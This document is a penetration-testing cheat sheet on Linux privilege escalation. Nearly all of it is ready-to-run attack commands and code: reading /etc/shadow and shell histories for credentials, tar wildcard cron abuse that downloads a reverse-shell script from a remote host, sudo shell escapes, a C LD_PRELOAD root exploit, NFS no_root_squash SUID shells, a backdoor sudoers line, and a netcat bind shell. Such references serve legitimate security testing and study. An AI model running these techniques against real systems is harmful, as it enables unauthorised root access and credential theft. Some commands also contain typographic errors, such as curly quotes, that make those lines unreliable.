# Linux Privilege Escalation

## Information Gathering

Key information

* OS release
* Kernel Version
* Available users and current user privileges
* SUID files
* View the installed packages to check for outdated versions

### OS Version

OS release:

```text
lsb_release -a
```

Kernel version

```text
uname -a
```

Is there a printer?

```text
lpstat -a
```

### Application & Services

```text
ps -aux
ps -ef
top
cat /etc/service
```

a = show processes for all users

u = display the process's user/owner

x = also show processes not attached to a terminal

#### Check program version

```text
/usr/local/bin/nmap --version
```

#### Determine which services are running as root

```text
ps aux | grep root
ps -ef | grep root
```

#### Determine what applications are installed and their version

```text
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
yum list | grep installed
```

#### Determine versions of important applications

```text
gcc -v
mysql --version
java -version
python --version
ruby -v
perl -v
```

**Attempt to display sensitive files**

```text
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

**Check for anything interesting in home directories**

```text
ls -ahlR /root/
ls -ahlR /home/
```

**Check for hardcoded passwords in scripts, databases or configuration files**

```text
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```

\*\*Dump all Local, LDAP, NIS, etc password hashes

```text
getent passwd
```

**Check user history for credentials and activity**

```text
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history
```

**Check user profile and mail**

```text
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

**Check for mail aliases or all aliases**

```text
cat /etc/aliases
getent aliases
```

#### Review system configurations

Syslog Configuration:

```text
cat /etc/syslog.conf
```

Web Server Configurations:

```text
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

PHP Configuration:

```text
/etc/php5/apache2/php.ini
```

Printer \(cupsd\) Configuration:

```text
cat /etc/cups/cupsd.conf
```

MySQL Configuration:

```text
cat /etc/my.conf
```

Inetd Configuration:

```text
cat /etc/inetd.conf
```

List All

```text
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
```

## Cron

### Wildcards

The \* character is regarded as a pattern and matches any string. In the below, we create a file "-l" and the command "ls- l" is executed.

```text
user@debian:/tmp$ ls *
backup.tar.gz useless
user@debian:/tmp$ touch '/tmp/-l'
user@debian:/tmp$ ls *
4 -rw-r-—r-- 1 root root 700 May 14 23:34 backup.tar.gz
4 -rw-r--r-— 1 root root 29 May 14 23:34 useless
```

#### Detection

**Determine scheduled jobs**

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

If a cron job periodically executes the TAR command is identified, privileged escalation is possible

```text
0 5 * * * root tar -zcf /var/backups/home.tgz /home/*
```

#### Exploitation

```text
 [user@localhost home]$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
 [user@localhost home]$ touch “–-checkpoint-action=exec=sh\ runme.sh”
 [user@localhost home]$ touch “–-checkpoint=1”
```

Or use a reverse shell method

```text
[user@localhost home]$ wget http://192.168.0.66/rshell.sh
[user@localhost home]$ touch “-–checkpoint-action=exec=sh rshell.sh”
[user@localhost home]$ touch “-–checkpoint=1”
<Open a listener on attack platform, wait for cronjob to  execute rshell.sh.>
```

### File Overwrite

Cron jobs can be exploited by looking scheduled tasks owned by privileged user but editable by your user. For example, a world writable script set to run every hour as root could be edited by you to run malicious superuser commands.

#### Detection

```text
cat /etc/crontab
```

Malicious Command Example

```text
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

#### Communications and Networking

#### Confidential Information & Users

**Identify current user and users in the system**

```text
id
who
w
last 
cat /etc/passwd | cut -d :  -f 1  # List users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
```

## Sudo

### Shell Escape Sequence

#### Detection

Show which commands sudo allows you to run

```text
sudo -l
```

Sample output:

```text
andrea@viserion:~$ sudo -l
Matching Defaults entries for andrea on viserion:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User andrea may run the following commands on viserion:
 (root) NOPASSWD: /usr/bin/find
 (root) NOPASSWD: /usr/bin/vim
 (root) NOPASSWD: /usr/bin/awk
```

If output is:

```text
[user] ALL=(ALL:ALL) ALL
```

or

```text
(root) ALL
```

Can escalate privilege directly

```text
sudo su
```

#### Exploit

**FTP**

```text
sudo ftp
!/bin/bash
```

**vi/vim**

```text
sudo vim -c '!sh'
```

**nano**

```text
sudo nano -S /bin/bash
```

**find**

```text
sudo find /etc/passwd -exec /bin/sh \;
```

**awk**

```text
sudo awk 'BEGIN {system("/bin/sh")}'
```

**less/more/man**

```text
sudo less /etc/hosts
```

```text
sudo more /etc/hosts
```

```text
sudo man ls
```

Then type !/bin/bash and hit enter

**nmap**

```text
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

**python**

```python
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

**perl**

```perl
sudo perl -e 'exec "/bin/bash";'
```

### Sudo \(LD\_PRELOAD\)

#### Detection

```text
user@debian:~$ sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```

#### Exploit

1. Write the following C code with any text editor in a writable directory
2. Compile and make a shared object file \(.so\)

   ```text
   gcc -fPIC -shared -o evil.so evil.c -nostartfiles
   ```

3. Run

   ```text
   sudo LD_PRELOAD=evil.so <COMMAND>
   ```

    mean which command have u allowed to do with sudo, you can use any sudo command which allowed to current user.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
   unsetenv("LD_PRELOAD");
   setgid(0);
   setuid(0);
   system("/bin/bash");
}
```

#### List Sudoers

```text
cat /etc/sudoers
```

## NFS

#### Detection

root\_squash: NFS shares change the root user to the nfsnobody user, an unprivileged user account If root\_squashing is turn off, NFS gives authority to the root user on the client to access files on the NFS server as root

```text
cat /etc/exports
```

If the following configuration is found

```text
<directory> *(rw, no_root_squash)
```

#### Exploitation

1. Check the share directory for everyone in the network

   ```text
   apt-get install nfs-common
   showmount -e <target ip>
   ```

2. Mount the NFS share to the local Linux System

   ```text
   mkdir /tmp/kw
   mount -t nfs <target ip>:/<share_directory> /tmp/kw
   ```

3. As root \(on local host\), compile and executable and place it in the mounted directory
4. Set suid permisiions to the executable
5. Run the file on the NFS server with your unprivileged user \(e.g. if you can ssh into the server\)

Bash

```text
cp /bin/bash .
chmod +s bash
ls -la bash
```

C code

```text
cp exploit.c /tmp/kw
cd /tmp/kw
gcc exploit.c -o shell
chmod +s shell
```

```c
#define NULL 0
int main(){
 setgid(0);
 setuid(0);
 execl("/bin/sh", "sh", NULL);
}
```

Sudoers file

```text
visudo /etc/sudoers
```

Add a line `<your user> ALL=(ALL:ALL) NOPASSWD: ALL`

## SUID files

#### Detection

```text
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

#### Exploitation

**Nmap \(2.02 to 5.21\)**

```text
nmap> !sh
sh-3.2# whoami
root
```

**Find**

```text
touch foo
find foo -exec whoami \;
```

Victim machine:

```text
find foo -exec netcat -lvp 5555 -e /bin/sh \;
```

Attacker machine:

```text
netcat 192.168.1.189 5555
id
cat /etc/shadow
```

**Vim**

The main use of Vim is to be text editor. However if it runs as SUID it will inherit the permission of the root user and therefore it could read all files on the system.

```text
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

**Bash**

```text
bash -p
bash-3.2# id
```

**Less/More**

```text
less /etc/passwd
!/bin/sh
```

Pop a shell

```text
!sh
```

## Create an exploit file

```text
touch exploit.c vim exploit.c
```

Compile

```text
gcc exploit.c -o exploit
```

Run

```text
./exploit
```

## Direction on Privilege Escalation

* Exploit against system
* Exploit against services
* Brute force credentials

## Tools

### unix-privesc-check

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)

### LinEnum

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

### linuxprivchecker

[http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)

### Lynis

[https://cisofy.com/lynis/](https://cisofy.com/lynis/)

## Reference

### List of Unix binaries that can be exploited by an attacker to bypass local security restrictions

[https://gtfobins.github.io/](https://gtfobins.github.io/)

